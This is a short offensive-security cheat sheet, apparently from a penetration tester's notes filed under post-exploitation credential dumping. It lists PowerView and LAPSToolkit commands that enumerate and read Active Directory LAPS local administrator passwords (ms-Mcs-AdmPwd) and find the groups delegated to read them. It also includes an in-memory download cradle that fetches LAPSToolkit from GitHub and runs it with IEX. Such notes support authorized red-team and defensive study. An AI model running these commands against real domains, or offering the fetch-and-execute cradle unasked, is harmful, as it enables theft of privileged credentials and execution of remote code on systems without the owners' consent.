# Scripts

## PowerSploit

```
PS C:\> Import-Module .\PowerView.ps1
```

Retrieve password.

```
PS C:\> Get-DomainObject -Identity <IP> -Properties ms-Mcs-AdmPwd
```

Find GPOs that have `LAPS` or some other descriptive term in the name.

```
PS C:\> Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | Select-Object DisplayName, Name, GPCFileSysPath | Format-List
```

Search computer objects where the `ms-Mcs-AdmPwdExpirationTime` property is not null (any Domain User can read this property).

```
PS C:\> Get-DomainObject -SearchBase "LDAP://[DC=<subdomain>,]DC=<domain>,DC=<tld>" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```

```powershell
Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object {
($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') 
}
```

## LAPSToolkit

Download cradle through memory.

```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/refs/heads/master/LAPSToolkit.ps1')
```

```
PS C:\> Get-LAPSComputers
```

```
PS C:\> Find-LAPSDelegatedGroups
```

```
PS C:\> Find-AdmPwdExtendedRights
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x04 - OS Credential Dumping/Windows/Active Directory/LAPS/Manual/Living off the Land]]

### Github

- [leoloobeek: LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)